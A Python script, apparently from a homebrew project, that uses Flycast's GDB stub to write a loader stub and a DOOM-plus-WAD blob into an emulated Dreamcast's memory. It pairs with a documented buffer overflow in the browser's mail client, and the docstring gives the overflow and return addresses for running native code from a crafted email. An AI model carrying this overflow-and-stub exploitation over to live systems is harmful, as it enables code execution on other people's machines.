#!/usr/bin/env python3
"""
native_stage.py -- jar-free staging for the email -> native SH-4 DOOM chain.

The email overflow (Bug #2, fn_application_x_dreamcas @ 0x8C04669C) gives PC control
and nothing else: 64 pad bytes + a 4-byte saved-PR. It cannot carry a payload, and the
only memory it writes is the stack, whose address moves ~32 KB between runs. So the
366-byte loader stub has to already be sitting at a fixed address when the `rts` fires.

The Java StageDoom service is one way to put it there (HTTP-stage the blob into the JVM
heap, then plant the stub via the setRawDeviceID(100) memcpy). This script is the other
way: write the same two things straight into RAM over Flycast's SH-4 GDB stub, with no
Java anywhere in the chain.

What the stub (build/stub.bin, built by build_stage_email.py) actually does -- see
doom_full.py:
    mask IRQs
    scan 0x8C400000..0x8CFF0000 for the 8-byte MAGIC ("DOOMSTG1")
    copy the WAD out to 0x8C450000   (FIRST -- the doom copy below lands on the
                                      blob's own WAD region, so order matters)
    copy doom.bin to 0x8CC00000
    patch g_wad {addr,size}
    jmp 0x8CC00000
It does not care how the blob got into the scan range, only that it is there.

Usage:
    python3 mac/native_stage.py            # stage blob + plant stub, then open the mail
    python3 mac/native_stage.py --verify   # re-read and check what is already staged
    python3 mac/native_stage.py --enter    # skip the email: jump straight to the stub

After a successful run, open the DOOM-STAGE message in the browser's mail client. The
overflow returns into 0x8C29ADE8 and native DOOM takes the CPU.
"""
import os, sys, time, struct, argparse

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
from gdbstub_probe import RSP, read_regs, read_mem

# Addresses. STUB_ADDR must match PR_STUB in build_stage_email.py and the saved-PR the
# email writes; BLOB_ADDR only has to land inside the stub's scan window.
STUB_ADDR = 0x8C29ADE8          # = setRawDeviceID dst 0x8C29ABE6 + 0x202
SCAN_LO, SCAN_HI = 0x8C400000, 0x8CFF0000
WAD_DST, DOOM_DST = 0x8C450000, 0x8CC00000
# Where Java parks the blob (JVM heap, per the talk's memory map). Chosen to sit above
# the WAD destination so the stub's WAD-then-doom copy order stays safe.
BLOB_ADDR = 0x8C867000

MAGIC_F = os.path.join(ROOT, "magic.txt")
STUB_F  = os.path.join(ROOT, "build", "stub.bin")
DOOM_F  = os.path.join(ROOT, "build", "doom.bin")
WAD_F   = os.path.join(ROOT, "wad", "doom1_trim.wad")


def log(m): print("   " + m, flush=True)
def banner(t): print("\n" + "=" * 68 + "\n== " + t + "\n" + "=" * 68, flush=True)


def drain(r):
    r.s.setblocking(False)
    try:
        while r.s.recv(4096):
            pass
    except Exception:
        pass
    r.s.setblocking(True)


def halt(r):
    r.s.send(b"\x03"); time.sleep(0.3); drain(r)


def wmem(r, addr, data, label="", chunk=1024):
    """RSP M-packets. Chunked at 1 KB like run_full_demo.py -- larger packets get
    silently truncated by this stub."""
    total = len(data); t0 = time.time(); nextpct = 10
    for i in range(0, total, chunk):
        c = data[i:i + chunk]
        if r.cmd("M%x,%x:%s" % (addr + i, len(c), c.hex())) != "OK":
            log("  write FAILED at +0x%x (%s)" % (i, label)); return False
        if label and total > 65536:
            pct = 100 * (i + len(c)) // total
            if pct >= nextpct:
                log("    %s %3d%%  (%d/%d KB, %.0fs)" % (label, pct, (i + len(c)) // 1024,
                                                         total // 1024, time.time() - t0))
                nextpct += 10
    return True


def rd(r, a, n):
    return read_mem(r, a, n)


def build_blob():
    magic = open(MAGIC_F, "rb").read().strip()
    assert len(magic) == 8, "magic.txt must be 8 bytes, got %r" % magic
    doom = open(DOOM_F, "rb").read()
    wad = open(WAD_F, "rb").read()
    return magic + doom + wad, magic, len(doom), len(wad)


def verify(r, blob, stub):
    ok = True
    got = rd(r, BLOB_ADDR, 8)
    log("blob magic @0x%08X : %r %s" % (BLOB_ADDR, got, "OK" if got == blob[:8] else "MISMATCH"))
    ok &= got == blob[:8]
    for off in (8, len(blob) // 2, len(blob) - 1):
        g = rd(r, BLOB_ADDR + off, 1)
        if not g or g[0] != blob[off]:
            log("  blob CORRUPT at +0x%x" % off); ok = False
    got = rd(r, STUB_ADDR, len(stub))
    same = got == stub
    log("stub  @0x%08X : %d bytes %s" % (STUB_ADDR, len(stub), "OK" if same else "MISMATCH"))
    ok &= same
    return ok


def main():
    global BLOB_ADDR
    ap = argparse.ArgumentParser()
    ap.add_argument("--verify", action="store_true", help="only check what is staged")
    ap.add_argument("--enter", action="store_true", help="jump to the stub instead of waiting for the email")
    ap.add_argument("--blob-addr", type=lambda s: int(s, 0), default=BLOB_ADDR)
    a = ap.parse_args()

    BLOB_ADDR = a.blob_addr
    if not (SCAN_LO <= BLOB_ADDR < SCAN_HI):
        sys.exit("!! blob addr 0x%08X is outside the stub's scan window 0x%08X..0x%08X"
                 % (BLOB_ADDR, SCAN_LO, SCAN_HI))

    for f in (MAGIC_F, STUB_F, DOOM_F, WAD_F):
        if not os.path.exists(f):
            sys.exit("!! missing %s -- run: python3 build_stage_email.py" % f)

    blob, magic, dlen, wlen = build_blob()
    stub = open(STUB_F, "rb").read()

    banner("jar-free staging over the SH-4 GDB stub")
    log("magic     %r" % magic)
    log("doom.bin  %d B -> will be copied by the stub to 0x%08X" % (dlen, DOOM_DST))
    log("WAD       %d B -> will be copied by the stub to 0x%08X" % (wlen, WAD_DST))
    log("blob      %d B -> 0x%08X..0x%08X (inside scan window)"
        % (len(blob), BLOB_ADDR, BLOB_ADDR + len(blob)))
    log("stub      %d B -> 0x%08X (where the email's saved-PR points)" % (len(stub), STUB_ADDR))
    if BLOB_ADDR < WAD_DST + wlen and BLOB_ADDR + len(blob) > WAD_DST:
        log("!! WARNING: blob overlaps the WAD destination 0x%08X" % WAD_DST)

    try:
        r = RSP()
    except Exception as e:
        sys.exit("!! cannot reach the GDB stub on :3263 (%s)\n   is Flycast running? mac/flycast.sh" % e)

    halt(r)
    regs = read_regs(r)
    log("halted, pc=0x%08X" % (regs["pc"] if regs else 0))

    if a.verify:
        ok = verify(r, blob, stub)
        r.send("c")
        print("\n" + ("[+] staged and consistent" if ok else "[!] NOT staged / corrupt"))
        return 0 if ok else 1

    t0 = time.time()
    if not wmem(r, BLOB_ADDR, blob, "blob"):
        r.send("c"); sys.exit("!! blob write failed")
    log("blob written in %.0fs" % (time.time() - t0))
    if not wmem(r, STUB_ADDR, stub, "stub"):
        r.send("c"); sys.exit("!! stub write failed")

    if not verify(r, blob, stub):
        r.send("c"); sys.exit("!! verification failed -- do not fire the email")

    if a.enter:
        log("entering the stub directly (pc=0x%08X)" % STUB_ADDR)
        r.cmd("P10=%s" % struct.pack("<I", STUB_ADDR).hex())   # r16 = pc
        r.send("c")
    else:
        r.send("c")
        banner("READY -- open the DOOM-STAGE email now")
        log("the MIME name= overflow sets saved PR to 0x%08X; rts enters the stub," % STUB_ADDR)
        log("which finds the blob, relocates it, and jumps to native DOOM.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
